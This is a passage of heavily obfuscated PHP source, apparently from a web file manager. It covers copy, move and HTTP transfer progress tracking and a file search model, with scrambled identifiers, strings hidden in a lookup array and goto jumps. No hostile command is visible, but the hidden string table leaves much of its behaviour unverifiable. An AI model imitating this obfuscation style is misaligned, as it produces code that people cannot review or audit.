array($this, $í‚ò¡ËË[1676])); Hook::unbind($í‚ò¡ËË[600], array($this, $í‚ò¡ËË[1677])); Hook::unbind($í‚ò¡ËË[601], array($this, $í‚ò¡ËË[1678])); Hook::unbind($í‚ò¡ËË[603], array($this, $í‚ò¡ËË[1679])); Hook::unbind($í‚ò¡ËË[604], array($this, $í‚ò¡ËË[1679])); Hook::unbind($í‚ò¡ËË[570], array($this, $í‚ò¡ËË[1680])); Hook::unbind($í‚ò¡ËË[567], array($this, $í‚ò¡ËË[1680])); Hook::unbind($í‚ò¡ËË[572], array($this, $í‚ò¡ËË[1680])); Hook::unbind($í‚ò¡ËË[574], array($this, $í‚ò¡ËË[1680])); Hook::unbind($í‚ò¡ËË[576], array($this, $í‚ò¡ËË[1680])); Hook::unbind($í‚ò¡ËË[1681], array($this, $í‚ò¡ËË[1682])); Hook::unbind($í‚ò¡ËË[593], array($this, $í‚ò¡ËË[1683])); Hook::unbind($í‚ò¡ËË[1684], array($this, $í‚ò¡ËË[1685])); Hook::unbind($í‚ò¡ËË[1686], array($this, $í‚ò¡ËË[1687])); Hook::unbind($í‚ò¡ËË[1688], array($this, $í‚ò¡ËË[1689])); } public function copyMoveStart($™ª¸Éä, $×ú€Šûí, $ˆìáö¼, $ä‘‰…î±) { $„Ã·ÏÖ =& $_SERVER[Æ š¦İÈ]; self::log($„Ã·ÏÖ[1699] . $×ú€Šûí . $„Ã·ÏÖ[70] . $ä‘‰…î±); $æ²‘ïì² = rtrim(TEMP_FILES, $„Ã·ÏÖ[8]); if (substr($×ú€Šûí, 0, strlen($æ²‘ïì²)) == $æ²‘ïì²) { return; } if (substr($ä‘‰…î±, 0, strlen($æ²‘ïì²)) == $æ²‘ïì²) { return; } $²ßªÌ =& $this->task; $²ßªÌ[$„Ã·ÏÖ[1700]] = KodIO::transferType($™ª¸Éä, $ˆìáö¼); $this->update(); } public function updateAfter() { $øê×§Šó =& $_SERVER[Æ š¦İÈ]; $¥ŸğËåê =& $this->task; if (!$¥ŸğËåê[$øê×§Šó[760]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¥ŸğËåê[$øê×§Šó[1700]] == $øê×§Šó[1293]) { return; } self::updateTask($¥ŸğËåê); } private static function updateTask(&$ÚåÂôàÈ) { $Ìù¥£×Á =& $_SERVER[Æ š¦İÈ]; if ($ÚåÂôàÈ[$Ìù¥£×Á[1700]] == $Ìù¥£×Á[1188] || $ÚåÂôàÈ[$Ìù¥£×Á[1700]] == $Ìù¥£×Á[108]) { if ($ÚåÂôàÈ[$Ìù¥£×Á[1694]]) { $ÚåÂôàÈ[$Ìù¥£×Á[1697]] = $ÚåÂôàÈ[$Ìù¥£×Á[1696]] + $ÚåÂôàÈ[$Ìù¥£×Á[1693]]; } } else { if ($ÚåÂôàÈ[$Ìù¥£×Á[1700]] == $Ìù¥£×Á[1294]) { if ($ÚåÂôàÈ[$Ìù¥£×Á[1694]] == $Ìù¥£×Á[1188]) { $ÚåÂôàÈ[$Ìù¥£×Á[1697]] = $ÚåÂôàÈ[$Ìù¥£×Á[1696]] + $ÚåÂôàÈ[$Ìù¥£×Á[1693]] * 0.5; } else { if ($ÚåÂôàÈ[$Ìù¥£×Á[1694]] == $Ìù¥£×Á[108]) { $ÚåÂôàÈ[$Ìù¥£×Á[1697]] = $ÚåÂôàÈ[$Ìù¥£×Á[1696]] + $ÚåÂôàÈ[$Ìù¥£×Á[1692]] * 0.5 + $ÚåÂôàÈ[$Ìù¥£×Á[1693]] * 0.5; } } } } $ÚåÂôàÈ[$Ìù¥£×Á[1646]] = $ÚåÂôàÈ[$Ìù¥£×Á[1697]] / $ÚåÂôàÈ[$Ìù¥£×Á[760]]; if ($ÚåÂôàÈ[$Ìù¥£×Á[1646]] > 0) { $Üñ›Çİ¼ = timeFloat() - $ÚåÂôàÈ[$Ìù¥£×Á[1648]] - $ÚåÂôàÈ[$Ìù¥£×Á[1651]]; $ÚåÂôàÈ[$Ìù¥£×Á[1652]] = $Üñ›Çİ¼ * (1 - $ÚåÂôàÈ[$Ìù¥£×Á[1646]]) / $ÚåÂôàÈ[$Ìù¥£×Á[1646]]; } } public function addPath($Å¢É–ÃÓ) { $¥Œ´îÜó =& $_SERVER[Æ š¦İÈ]; if (!$Å¢É–ÃÓ) { return; } $œÜÀ•„¡ =& $this->task; $÷‹£¦‹ = IO::infoWithChildren($Å¢É–ÃÓ); $œŞÌø™È = $œÜÀ•„¡[$¥Œ´îÜó[1701]] ? $œÜÀ•„¡[$¥Œ´îÜó[1701]][$¥Œ´îÜó[1702]] : 0; $œÜÀ•„¡[$¥Œ´îÜó[1701]] = array($¥Œ´îÜó[1702] => $œŞÌø™È + 1, $¥Œ´îÜó[423] => $÷‹£¦‹[$¥Œ´îÜó[32]], $¥Œ´îÜó[78] => $÷‹£¦‹[$¥Œ´îÜó[78]], $¥Œ´îÜó[521] => $÷‹£¦‹[$¥Œ´îÜó[521]] ? $÷‹£¦‹[$¥Œ´îÜó[521]] : $÷‹£¦‹[$¥Œ´îÜó[78]]); if ($÷‹£¦‹[$¥Œ´îÜó[33]] == $¥Œ´îÜó[194]) { $œÜÀ•„¡[$¥Œ´îÜó[783]] += 1; } else { $œÜÀ•„¡[$¥Œ´îÜó[783]] += $÷‹£¦‹[$¥Œ´îÜó[83]][$¥Œ´îÜó[81]]; if ($÷‹£¦‹[$¥Œ´îÜó[405]]) { $œÜÀ•„¡[$¥Œ´îÜó[783]] += $÷‹£¦‹[$¥Œ´îÜó[83]][$¥Œ´îÜó[82]] + 1; } } $œÜÀ•„¡[$¥Œ´îÜó[760]] += $÷‹£¦‹[$¥Œ´îÜó[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($À®ŠäÁÎ) { $š¿şÃ¼ü =& $_SERVER[Æ š¦İÈ]; $éåò¡±ƒ =& $this->task; $éåò¡±ƒ[$š¿şÃ¼ü[1690]] = $À®ŠäÁÎ[$š¿şÃ¼ü[32]]; $éåò¡±ƒ[$š¿şÃ¼ü[1055]] = $À®ŠäÁÎ[$š¿şÃ¼ü[32]]; $this->update(); } public function copyFileStart($Üø¾£ç­, $Ç‰€€ü, $ò¸·ıÊ³, $ıÄÔî˜, $‹÷€Œ‚æ, $ñ¯í„±) { $¬ÙÄ€Êº =& $_SERVER[Æ š¦İÈ]; $µÏ„‡ = $‹÷€Œ‚æ; if ($µÏ„‡ == $GLOBALS[$¬ÙÄ€Êº[1703]]) { $µÏ„‡ = $GLOBALS[$¬ÙÄ€Êº[1704]]; } $GLOBALS[$¬ÙÄ€Êº[1704]] = $‹÷€Œ‚æ; $GLOBALS[$¬ÙÄ€Êº[1703]] = $ñ¯í„±; $’¾³Ìú“ =& $this->task; $’¾³Ìú“[$¬ÙÄ€Êº[1690]] = $µÏ„‡; $’¾³Ìú“[$¬ÙÄ€Êº[1692]] = (int) $Üø¾£ç­->size($Ç‰€€ü); $’¾³Ìú“[$¬ÙÄ€Êº[1693]] = 0; $’¾³Ìú“[$¬ÙÄ€Êº[1055]] = $¬ÙÄ€Êº[12]; $’¾³Ìú“[$¬ÙÄ€Êº[1694]] = $¬ÙÄ€Êº[12]; $’¾³Ìú“[$¬ÙÄ€Êº[1695]] = 0; $óùÕæ¿ = $’¾³Ìú“[$¬ÙÄ€Êº[1692]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($’¾³Ìú“[$¬ÙÄ€Êº[403]] . $¬ÙÄ€Êº[1705]); if ($óùÕæ¿ && file_exists(get_path_father($ıÄÔî˜))) { Cache::set($’¾³Ìú“[$¬ÙÄ€Êº[403]] . $¬ÙÄ€Êº[1705], $ıÄÔî˜); $’¾³Ìú“[$¬ÙÄ€Êº[1666]] = array($¬ÙÄ€Êº[1706], $¬ÙÄ€Êº[1707]); } $this->update(0, $óùÕæ¿); } public static function updateCopyLocalFileSize($¿å–ë²) { $‚ä…éêú =& $_SERVER[Æ š¦İÈ]; $™¥é½Ù = Cache::get($¿å–ë²[$‚ä…éêú[403]] . $‚ä…éêú[1705]); if (!$™¥é½Ù || !file_exists($™¥é½Ù)) { return $¿å–ë²; } $¿å–ë²[$‚ä…éêú[1693]] = @filesize($™¥é½Ù); $¿å–ë²[$‚ä…éêú[1697]] += $¿å–ë²[$‚ä…éêú[1693]]; self::updateTask($¿å–ë²); return $¿å–ë²; } public function copyFileEnd($ğ÷“›ÑÒ, $øù÷úÀ©, $’Ó«û¬‹, $ÍÆ×†é†, $¨‰Õ©ŒŸ, $¥Ó ¾¯) { $ªØ şó =& $_SERVER[Æ š¦İÈ]; $¦’˜óÈ£ =& $this->task; $¦’˜óÈ£[$ªØ şó[1693]] = $¦’˜óÈ£[$ªØ şó[1692]]; $¦’˜óÈ£[$ªØ şó[1694]] = $ªØ şó[12]; unset($¦’˜óÈ£[$ªØ şó[1666]]); if ($¨‰Õ©ŒŸ == $¦’˜óÈ£[$ªØ şó[1690]]) { $¦’˜óÈ£[$ªØ şó[1696]] += $¦’˜óÈ£[$ªØ şó[1692]]; $¦’˜óÈ£[$ªØ şó[1697]] = $¦’˜óÈ£[$ªØ şó[1696]]; $this->update(1); } else { $this->update(); $¦’˜óÈ£[$ªØ şó[1693]] = 0; } Cache::remove($¦’˜óÈ£[$ªØ şó[403]] . $ªØ şó[1705]); self::log($ªØ şó[1708] . $øù÷úÀ© . $ªØ şó[70] . $ÍÆ×†é† . $ªØ şó[228] . $¨‰Õ©ŒŸ . $ªØ şó[1709] . $¦’˜óÈ£[$ªØ şó[1690]]); } public function updateFileEnd($É‚Í­×Ñ, $úÊÒê€) { $ë©«™Ä =& $_SERVER[Æ š¦İÈ]; $½‡ªöíä =& $this->task; $½‡ªöíä[$ë©«™Ä[1690]] = $É‚Í­×Ñ; $½‡ªöíä[$ë©«™Ä[1692]] = $úÊÒê€; $½‡ªöíä[$ë©«™Ä[1696]] += $úÊÒê€; $½‡ªöíä[$ë©«™Ä[1697]] = $½‡ªöíä[$ë©«™Ä[1696]]; $this->update(1); self::log($ë©«™Ä[1710] . $É‚Í­×Ñ); } public function sourceModelCopy($œë¤±£ù) { $ÎÎÈ”–¥ =& $_SERVER[Æ š¦İÈ]; $ÎòÖš™Á = $œë¤±£ù[0]; $İêª¨éò = $œë¤±£ù[1]; $è±ßÛ©ò =& $this->task; $this->sourceModelCopyFlag = !0; $Ëµè¼ƒ¦ = 0; switch ($ÎòÖš™Á) { case $ÎÎÈ”–¥[568]: $Ëµè¼ƒ¦ = 1; break; case $ÎÎÈ”–¥[571]: $è±ßÛ©ò[$ÎÎÈ”–¥[1690]] = $İêª¨éò[$ÎÎÈ”–¥[32]]; break; case $ÎÎÈ”–¥[573]: $Ëµè¼ƒ¦ = intval($œë¤±£ù[$ÎÎÈ”–¥[377]] * 0.4); break; case $ÎÎÈ”–¥[575]: $Ëµè¼ƒ¦ = intval($œë¤±£ù[$ÎÎÈ”–¥[377]] * 0.2); break; case $ÎÎÈ”–¥[577]: $Ëµè¼ƒ¦ = intval($œë¤±£ù[$ÎÎÈ”–¥[377]] * 0.4); break; } $this->update($Ëµè¼ƒ¦); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¾÷¾İâ, $µÄ‘û€İ) { $‚ººú°ó =& $_SERVER[Æ š¦İÈ]; $this->sourceModelCopyFlag = !0; $ıôİÛå‚ = 1; if (isset($¾÷¾İâ[$‚ººú°ó[83]])) { $ıôİÛå‚ = $¾÷¾İâ[$‚ººú°ó[83]][$‚ººú°ó[81]] + $¾÷¾İâ[$‚ººú°ó[83]][$‚ººú°ó[82]] + 1; } $this->update($ıôİÛå‚); $this->sourceModelCopyFlag = !1; } public function sourceMove($™÷„©ì) { $this->sourceRemove($™÷„©ì, !1); } public function curlProgress($¶ü¾Ù£Æ, $ÊÕòä¯¨, $ÎÇ¥–Æ, $“óÕ·©Õ, $óı†ÓôÅ) { $Å›ö†»ü =& $_SERVER[Æ š¦İÈ]; $íšıÆéå =& $this->task; if ($óı†ÓôÅ > 0) { $íšıÆéå[$Å›ö†»ü[1055]] = $Å›ö†»ü[1711]; $íšıÆéå[$Å›ö†»ü[1694]] = $Å›ö†»ü[108]; if ($íšıÆéå[$Å›ö†»ü[1692]]) { $íšıÆéå[$Å›ö†»ü[1693]] = $óı†ÓôÅ; } if ($íšıÆéå[$Å›ö†»ü[1695]]) { $íšıÆéå[$Å›ö†»ü[1693]] = $óı†ÓôÅ + $íšıÆéå[$Å›ö†»ü[1695]]; } } else { if ($ÎÇ¥–Æ > 0) { if ($íšıÆéå[$Å›ö†»ü[1692]] == $ÊÕòä¯¨) { $íšıÆéå[$Å›ö†»ü[1693]] = $ÎÇ¥–Æ; $íšıÆéå[$Å›ö†»ü[1055]] = $Å›ö†»ü[1712]; $íšıÆéå[$Å›ö†»ü[1694]] = $Å›ö†»ü[1188]; } } } $this->update(); } public function curlProgressStart($³–Ûôôâ) { } public function curlProgressEnd($ò¯şŠü›) { $œıØ™íÚ =& $_SERVER[Æ š¦İÈ]; $İ×ßÔê =& $this->task; $˜‰¢­š = curl_getinfo($ò¯şŠü›); $¨˜êŠ– = $˜‰¢­š[$œıØ™íÚ[1713]]; if ($¨˜êŠ– == -1) { $¨˜êŠ– = $˜‰¢­š[$œıØ™íÚ[1714]]; } if ($İ×ßÔê[$œıØ™íÚ[1694]] == $œıØ™íÚ[108] && $¨˜êŠ–) { $İ×ßÔê[$œıØ™íÚ[1695]] += $¨˜êŠ–; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $¬Ëô¡¥‚ =& $_SERVER[Æ š¦İÈ]; $ƒìîÀìí =& $this->task; $ƒìîÀìí[$¬Ëô¡¥‚[1715]] = 1; Hook::bind($¬Ëô¡¥‚[1684], array($this, $¬Ëô¡¥‚[1716])); Hook::bind($¬Ëô¡¥‚[1686], array($this, $¬Ëô¡¥‚[1717])); Hook::bind($¬Ëô¡¥‚[1688], array($this, $¬Ëô¡¥‚[1718])); } protected function endAfter() { $Ç’ïô‡ =& $_SERVER[Æ š¦İÈ]; Hook::unbind($Ç’ïô‡[1684], array($this, $Ç’ïô‡[1716])); Hook::unbind($Ç’ïô‡[1686], array($this, $Ç’ïô‡[1717])); Hook::unbind($Ç’ïô‡[1688], array($this, $Ç’ïô‡[1718])); } public function progressStart($Ëäºˆ¶‰) { $¯û²Ä‚‡ =& $_SERVER[Æ š¦İÈ]; $ã‚±¬ÓÈ = curl_getinfo($Ëäºˆ¶‰); self::log($¯û²Ä‚‡[1719] . $ã‚±¬ÓÈ[$¯û²Ä‚‡[304]]); self::valueSet($this->task[$¯û²Ä‚‡[403]], $this->task); } public function progressEnd($ô®õş¼Ÿ) { $…ˆäÏàÔ =& $_SERVER[Æ š¦İÈ]; self::log($…ˆäÏàÔ[1720] . $this->task[$…ˆäÏàÔ[403]]); $this->end(); } public function progress($­ÆÇ‰Ë , $¸ÏÕôË, $–™íÄ€”, $È‰ØÈ”÷, $Ğãş’°º) { $”…”ö¬Œ =& $_SERVER[Æ š¦İÈ]; $µº—²€Ú =& $this->task; if ($Ğãş’°º > 0) { $µº—²€Ú[$”…”ö¬Œ[783]] = $µº—²€Ú[$”…”ö¬Œ[783]] == 0 ? $È‰ØÈ”÷ : $µº—²€Ú[$”…”ö¬Œ[783]]; $µº—²€Ú[$”…”ö¬Œ[1645]] = $Ğãş’°º; } else { if ($–™íÄ€” > 0) { $µº—²€Ú[$”…”ö¬Œ[783]] = $µº—²€Ú[$”…”ö¬Œ[783]] == 0 ? $¸ÏÕôË : $µº—²€Ú[$”…”ö¬Œ[783]]; $µº—²€Ú[$”…”ö¬Œ[1645]] = $–™íÄ€”; } } $this->update(); self::log("\x70\162\157\x67\162\145\163\x73\x48\164\164\x70\x3a\144\x6f\167\x6e\x3a{$–™íÄ€”}\x2f{$¸ÏÕôË}\73\x20\165\160\x6c\157\141\x64\x3a{$Ğãş’°º}\57{$È‰ØÈ”÷}\73"); } } goto aáâ‘í”Ç„; Bñí­™ìĞ‹: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÅÓ­”ò­) { $ƒ‚–ì£ó =& $_SERVER[Æ š¦İÈ]; $şÎ“–‡è = KodIO::fileTypeList(); $™èÛ ¦ = $şÎ“–‡è[$ÅÓ­”ò­]; if (!$™èÛ ¦) { return array(); } $Äûû‡á = $™èÛ ¦[$ƒ‚–ì£ó[169]]; $¯èÍı… = $ƒ‚–ì£ó[7]; if (!$™èÛ ¦[$ƒ‚–ì£ó[169]]) { $ïß˜ÖÅÌ = array_to_keyvalue($şÎ“–‡è, $ƒ‚–ì£ó[12], $ƒ‚–ì£ó[169]); $Äûû‡á = implode($ƒ‚–ì£ó[50], $ïß˜ÖÅÌ); $¯èÍı… = $ƒ‚–ì£ó[2057]; } $·ú¡¼Ú = explode($ƒ‚–ì£ó[50], trim($Äûû‡á, $ƒ‚–ì£ó[50])); return array($¯èÍı…, $·ú¡¼Ú); } public function listPathType($Ä´µÊêï) { $Ò˜¬ª¹® =& $_SERVER[Æ š¦İÈ]; $ÑõøéÚ = $this->fileTypeWhere($Ä´µÊêï); if (!$ÑõøéÚ) { return array(); } $Œ§š†í½ = array($Ò˜¬ª¹®[582] => SourceModel::TYPE_USER, $Ò˜¬ª¹®[583] => USER_ID, $Ò˜¬ª¹®[579] => 0, $Ò˜¬ª¹®[580] => $ÑõøéÚ); return $this->listSource($Œ§š†í½); } public function listSearch($çÁØ§Ş, $æ¤©Ü‘› = 300) { $—ÙŞçÈ =& $_SERVER[Æ š¦İÈ]; if (isset($çÁØ§Ş[$—ÙŞçÈ[1903]]) && $çÁØ§Ş[$—ÙŞçÈ[1903]]) { $çÁØ§Ş[$—ÙŞçÈ[1903]] = str_replace($—ÙŞçÈ[381], $—ÙŞçÈ[2058], trim($çÁØ§Ş[$—ÙŞçÈ[1903]])); } $½ğ¢®¯† = $this->_parseSearchWhere($çÁØ§Ş); $àı¾ª­ = $½ğ¢®¯†; if (!isset($½ğ¢®¯†[$—ÙŞçÈ[433]])) { $½ğ¢®¯†[$—ÙŞçÈ[433]] = 0; } $»Êâ¾˜ä = $—ÙŞçÈ[2059]; $ëò–ï‰È = $»Êâ¾˜ä; $this->_listSearchBindPinyin($çÁØ§Ş, $½ğ¢®¯†, $»Êâ¾˜ä); $this->alias($—ÙŞçÈ[446])->_makeOrder(); $½ğ¢®¯† = $this->parseWhereLike($½ğ¢®¯†); $ŒÅ˜íÇ† = $this->distinct(!0)->field($»Êâ¾˜ä)->where($½ğ¢®¯†)->selectPage($æ¤©Ü‘›); $this->_listSearchFileContent($ŒÅ˜íÇ†, $çÁØ§Ş, $ëò–ï‰È, $àı¾ª­); $this->_listSearchDesc($ŒÅ˜íÇ†, $çÁØ§Ş, $ëò–ï‰È); $this->_listSearchTag($ŒÅ˜íÇ†, $çÁØ§Ş, $ëò–ï‰È); $this->_listSearchGroupTag($ŒÅ˜íÇ†, $çÁØ§Ş, $ëò–ï‰È); $this->_listDataApply($ŒÅ˜íÇ†[$—ÙŞçÈ[366]]); $this->_listMake($ŒÅ˜íÇ†); return $ŒÅ˜íÇ†; } private function _listSearchFileContent(&$‚”ÂÚªé, $œ“‘ÜÌ€, $Â“ĞÓĞ, $“¥ÏßÎ) { $µÎ–Àš· =& $_SERVER[Æ š¦İÈ]; if (!$œ“‘ÜÌ€[$µÎ–Àš·[1903]] || $‚”ÂÚªé[$µÎ–Àš·[363]][$µÎ–Àš·[350]] > 1) { return; } if (!isset($“¥ÏßÎ[$µÎ–Àš·[32]]) || !is_array($œ“‘ÜÌ€[$µÎ–Àš·[469]])) { return; } $“¥ÏßÎ[$µÎ–Àš·[469]] = array($µÎ–Àš·[7], $œ“‘ÜÌ€[$µÎ–Àš·[469]]); unset($“¥ÏßÎ[$µÎ–Àš·[32]]); unset($œ“‘ÜÌ€[$µÎ–Àš·[469]]); $Ä¨áñöÛ = $this->field($Â“ĞÓĞ)->where($“¥ÏßÎ)->limit($µÎ–Àš·[2060])->select(); if (!$Ä¨áñöÛ || count($Ä¨áñöÛ) == 0) { return; } $‚”ÂÚªé[$µÎ–Àš·[366]] = array_merge($Ä¨áñöÛ, $‚”ÂÚªé[$µÎ–Àš·[366]]); $‚”ÂÚªé[$µÎ–Àš·[363]][$µÎ–Àš·[364]] += count($Ä¨áñöÛ); } private function _listSearchTag(&$úä›“Ğ, $»ç±Ü€Á, $¥ï¬Ú‡Š) { $Ğıôî¬Ş =& $_SERVER[Æ š¦İÈ]; if (!$»ç±Ü€Á[$Ğıôî¬Ş[1903]] || $úä›“Ğ[$Ğıôî¬Ş[363]][$Ğıôî¬Ş[350]] > 1) { return; } $ÒîşÃÎö = Model($Ğıôî¬Ş[2061])->listData(); $˜¥‹‡ùà = array(); $‘Ëšå™® = $»ç±Ü€Á[$Ğıôî¬Ş[1903]]; foreach ($ÒîşÃÎö as $ùô¹’—Æ) { $çõí“ = $ùô¹’—Æ[$Ğıôî¬Ş[32]]; $¢®ü¢«ó = str_replace($Ğıôî¬Ş[53], $Ğıôî¬Ş[12], Pinyin::get($çõí“)); if (stripos($çõí“, $‘Ëšå™®) !== !1 || stripos($¢®ü¢«ó, $‘Ëšå™®) !== !1) { $˜¥‹‡ùà[] = $ùô¹’—Æ[$Ğıôî¬Ş[403]]; } } if (!$˜¥‹‡ùà) { return; } $¸Ğ²³’û = array($Ğıôî¬Ş[429] => array($Ğıôî¬Ş[7], $˜¥‹‡ùà), $Ğıôî¬Ş[1644] => USER_ID); $îƒ¬ÖİÍ = Model($Ğıôî¬Ş[430])->field($Ğıôî¬Ş[78])->where($¸Ğ²³’û)->select(); $îƒ¬ÖİÍ = array_to_keyvalue($îƒ¬ÖİÍ, $Ğıôî¬Ş[12], $Ğıôî¬Ş[78]); $©€™˜—Â = array_unique($îƒ¬ÖİÍ); $this->_listSearchMerge($úä›“Ğ, $»ç±Ü€Á, $¥ï¬Ú‡Š, $©€™˜—Â); } private function _listSearchDesc(&$òÓêÅÛ, $íœ‚àÈá, $­Êé¯¦ñ) { $êØğŒÓ =& $_SERVER[Æ š¦İÈ]; if (!$íœ‚àÈá[$êØğŒÓ[1903]] || $òÓêÅÛ[$êØğŒÓ[363]][$êØğŒÓ[350]] > 1) { return; } $±ÖÆ–ä— = $this->listSearchChildren($íœ‚àÈá[$êØğŒÓ[500]]); $±ÖÆ–ä— = array_unique($±ÖÆ–ä—); if (!$±ÖÆ–ä—) { return; } $‡‹³Éõú = array($êØğŒÓ[405] => array($êØğŒÓ[7], $±ÖÆ–ä—), $êØğŒÓ[95] => $êØğŒÓ[453], $êØğŒÓ[371] => array($êØğŒÓ[380], $êØğŒÓ[1905] . $íœ‚àÈá[$êØğŒÓ[1903]] . $êØğŒÓ[1905])); $é®ï¡³ = Model($êØğŒÓ[565])->field($êØğŒÓ[405])->where($‡‹³Éõú)->select(); $ß¤Ö›¹³ = array_to_keyvalue($é®ï¡³, $êØğŒÓ[12], $êØğŒÓ[405]); $this->_listSearchMerge($òÓêÅÛ, $íœ‚àÈá, $­Êé¯¦ñ, $ß¤Ö›¹³); } private function _listSearchGroupTag(&$…‹Úñ¯Ö, $Ì²ŒÇ¢¥, $ÑÒƒú) { $¡‡ÌÑá‡ =& $_SERVER[Æ š¦İÈ]; if (!$Ì²ŒÇ¢¥[$¡‡ÌÑá‡[1903]] || $…‹Úñ¯Ö[$¡‡ÌÑá‡[363]][$¡‡ÌÑá‡[350]] > 1 || !$Ì²ŒÇ¢¥[$¡‡ÌÑá‡[500]]) { return; } $äÎÕİä = $this->sourceInfo($Ì²ŒÇ¢¥[$¡‡ÌÑá‡[500]]); if (!$äÎÕİä || $äÎÕİä[$¡‡ÌÑá‡[414]] != SourceModel::TYPE_GROUP) { return; } $€èÔ·× = $äÎÕİä[$¡‡ÌÑá‡[506]]; $Ç˜‚ŒÈØ = Model($¡‡ÌÑá‡[2062])->get($€èÔ·×); $˜„áÉ§’ = array(); $ÛÊÓñƒ¸ = $Ì²ŒÇ¢¥[$¡‡ÌÑá‡[1903]]; foreach ($Ç˜‚ŒÈØ[$¡‡ÌÑá‡[366]] as $ìñíğ¦ä) { $áÈŞÖÙŒ = $ìñíğ¦ä[$¡‡ÌÑá‡[32]]; $ƒ¡‰‘Óä = str_replace($¡‡ÌÑá‡[53], $¡‡ÌÑá‡[12], Pinyin::get($áÈŞÖÙŒ)); if (stripos($áÈŞÖÙŒ, $ÛÊÓñƒ¸) !== !1 || stripos($ƒ¡‰‘Óä, $ÛÊÓñƒ¸) !== !1) { $˜„áÉ§’[] = $ìñíğ¦ä[$¡‡ÌÑá‡[403]]; } } if (!$˜„áÉ§’) { return; } $ÓÄ¼¡À² = array($¡‡ÌÑá‡[429] => array($¡‡ÌÑá‡[7], $˜„áÉ§’), $¡‡ÌÑá‡[1644] => 0, $¡‡ÌÑá‡[33] => $¡‡ÌÑá‡[1925] . $€èÔ·×); $ÇÛĞ‚ = Model($¡‡ÌÑá‡[430])->field($¡‡ÌÑá‡[78])->where($ÓÄ¼¡À²)->select(); $ÇÛĞ‚ = array_to_keyvalue($ÇÛĞ‚, $¡‡ÌÑá‡[12], $¡‡ÌÑá‡[78]); $ œÚ®Í = array_unique($ÇÛĞ‚); $this->_listSearchMerge($…‹Úñ¯Ö, $Ì²ŒÇ¢¥, $ÑÒƒú, $ œÚ®Í); } private function _listSearchMerge(&$‰­°àÌ˜, $ËÛÈª¥ò, $ÑƒşÄ’ê, $¾§óÁıƒ) { $Íúòáğâ =& $_SERVER[Æ š¦İÈ]; if (!$¾§óÁıƒ) { return; } $‰¦õø·Ç = array_to_keyvalue($‰­°àÌ˜[$Íúòáğâ[366]], $Íúòáğâ[12], $Íúòáğâ[405]); $üéûõ­ = array_diff($¾§óÁıƒ, $‰¦õø·Ç); if (!$üéûõ­) { return; } $û¦ŠÜ³ƒ = array($Íúòáğâ[405] => array($Íúòáğâ[7], $üéûõ­)); $ŞñÓ¸·­ = $this->field($ÑƒşÄ’ê)->where($û¦ŠÜ³ƒ)->select(); if (!$ŞñÓ¸·­) { return; } $öÃáÛî = array(); foreach ($ŞñÓ¸·­ as $½îİ³ä‚) { if ($this->_listSearchFilter($½îİ³ä‚, $ËÛÈª¥ò)) { $öÃáÛî[] = $½îİ³ä‚; } } $‰­°àÌ˜[$Íúòáğâ[366]] = array_merge($öÃáÛî, $‰­°àÌ˜[$Íúòáğâ[366]]); $‰­°àÌ˜[$Íúòáğâ[363]][$Íúòáğâ[364]] += count($öÃáÛî); } private function _listSearchFilter($òÒ¥†, $‡ı‹õğ¢) { $¿Ó‹÷›ñ =& $_SERVER[Æ š¦İÈ]; $ºĞÛ†¡ = $òÒ¥†[$¿Ó‹÷›ñ[413]] == $¿Ó‹÷›ñ[89]; if (!strstr($òÒ¥†[$¿Ó‹÷›ñ[523]], $¿Ó‹÷›ñ[50] . $‡ı‹õğ¢[$¿Ó‹÷›ñ[500]] . $¿Ó‹÷›ñ[50])) { return !1; } if (isset($‡ı‹õğ¢[$¿Ó‹÷›ñ[415]]) && $‡ı‹õğ¢[$¿Ó‹÷›ñ[415]] != $¿Ó‹÷›ñ[1866]) { if ($‡ı‹õğ¢[$¿Ó‹÷›ñ[415]] == $¿Ó‹÷›ñ[79] && !$ºĞÛ†¡) { return !1; } if ($‡ı‹õğ¢[$¿Ó‹÷›ñ[415]] != $¿Ó‹÷›ñ[79] && $ºĞÛ†¡) { return !1; } if (!strstr($òÒ¥†[$¿Ó‹÷›ñ[169]], $¿Ó‹÷›ñ[50] . $‡ı‹õğ¢[$¿Ó‹÷›ñ[415]] . $¿Ó‹÷›ñ[50])) { return !1; } } if (isset($‡ı‹õğ¢[$¿Ó‹÷›ñ[2063]]) && $‡ı‹õğ¢[$¿Ó‹÷›ñ[2063]] < $òÒ¥†[$¿Ó‹÷›ñ[80]]) { return !1; } if (isset($‡ı‹õğ¢[$¿Ó‹÷›ñ[2064]]) && $‡ı‹õğ¢[$¿Ó‹÷›ñ[2064]] > $òÒ¥†[$¿Ó‹÷›ñ[80]]) { return !1; } if (isset($‡ı‹õğ¢[$¿Ó‹÷›ñ[596]]) && $‡ı‹õğ¢[$¿Ó‹÷›ñ[596]] != $òÒ¥†[$¿Ó‹÷›ñ[456]]) { return !1; } return !0; } public function listSearchChildren($˜î–Õ§å, $ôëÎÒë = 5000) { $¡æõÊÊÃ =& $_SERVER[Æ š¦İÈ]; $áø™Ãç = array(); $…Òš×¿ = $this->sourceInfo($˜î–Õ§å); $’Æğ÷£ô = array($¡æõÊÊÃ[523] => array($¡æõÊÊÃ[380], $…Òš×¿[$¡æõÊÊÃ[523]] . $…Òš×¿[$¡æõÊÊÃ[405]] . $¡æõÊÊÃ[547])); $ôŞ„¥àø = $this->field($¡æõÊÊÃ[80])->where($’Æğ÷£ô)->limit($ôëÎÒë + 1)->select(); $å…ãû©É = is_array($ôŞ„¥àø) ? count($ôŞ„¥àø) : 0; if ($å…ãû©É > $ôëÎÒë) { return $this->_listSearchChildrenNear($˜î–Õ§å, $ôëÎÒë); } $äˆ¯ˆ°ù = $this->field($¡æõÊÊÃ[405])->where($’Æğ÷£ô)->select(); $áø™Ãç = array_to_keyvalue($äˆ¯ˆ°ù, $¡æõÊÊÃ[12], $¡æõÊÊÃ[405]); return $áø™Ãç; } private function _listSearchChildrenNear($¾¦äçòê, $ô®é­ƒ) { $‘•ÈçÜü =& $_SERVER[Æ š¦İÈ]; $æîÙºÁ = array(); $‹”«Úåæ = array($‘•ÈçÜü[500] => $¾¦äçòê); $À‚Ûê¡á = $this->field($‘•ÈçÜü[2065])->where($‹”«Úåæ)->select(); $®ûşÜØŒ = 